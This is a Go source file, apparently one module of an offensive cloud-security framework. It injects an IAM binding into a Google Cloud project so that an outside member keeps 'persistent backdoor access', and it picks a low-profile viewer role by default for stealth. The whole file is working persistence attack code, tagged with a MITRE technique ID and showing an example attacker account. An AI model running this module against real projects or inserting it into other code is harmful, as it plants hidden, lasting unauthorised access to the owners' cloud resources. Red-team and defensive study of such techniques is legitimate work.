package iam

import (
	"context"
	"fmt"

	cloudresourcemanager "google.golang.org/api/cloudresourcemanager/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&InjectBinding{})
}

// InjectBinding adds a stealthy IAM binding for persistent access.
type InjectBinding struct{}

func (m *InjectBinding) Info() module.Info {
	return module.Info{
		Name:         "persist.iam.inject-binding",
		Tactic:       module.TacticPersist,
		Service:      "iam",
		Description:  "Add IAM binding for persistent backdoor access to a project",
		RequiresAuth: true,
		AttackID:     "T1098.001",
	}
}

func (m *InjectBinding) Run(ctx module.RunContext) error {
	member := ctx.Flags["member"]
	role := ctx.Flags["role"]
	if role == "" {
		role = "roles/viewer"
	}

	project := ""
	if len(ctx.Projects) > 0 {
		project = ctx.Projects[0]
	}

	if member == "" || project == "" {
		output.Warn("Usage: run persist.iam.inject-binding --member <member> [--role <role>] -p <project>")
		output.Info("Default role: roles/viewer (stealthy). Example member: user:attacker@gmail.com")
		return nil
	}

	svc, err := cloudresourcemanager.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create client: %w", err)
	}

	output.Info("Injecting binding: %s -> %s on %s", member, role, project)

	policy, err := svc.Projects.GetIamPolicy(project, &cloudresourcemanager.GetIamPolicyRequest{}).Do()
	if err != nil {
		return fmt.Errorf("get policy: %w", err)
	}

	found := false
	for _, binding := range policy.Bindings {
		if binding.Role == role {
			for _, m := range binding.Members {
				if m == member {
					output.Info("Binding already exists.")
					return nil
				}
			}
			binding.Members = append(binding.Members, member)
			found = true
			break
		}
	}
	if !found {
		policy.Bindings = append(policy.Bindings, &cloudresourcemanager.Binding{
			Role:    role,
			Members: []string{member},
		})
	}

	_, err = svc.Projects.SetIamPolicy(project, &cloudresourcemanager.SetIamPolicyRequest{
		Policy: policy,
	}).Do()
	if err != nil {
		return fmt.Errorf("set policy: %w", err)
	}

	output.Success("Persistence binding injected: %s -> %s on %s", member, role, project)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "persist.iam.inject-binding",
			Severity:    module.SevHigh,
			Title:       "IAM persistence binding injected",
			Description: fmt.Sprintf("Added %s with %s on project %s for persistent access", member, role, project),
			Resource:    project,
			Project:     project,
		}
	}

	return nil
}
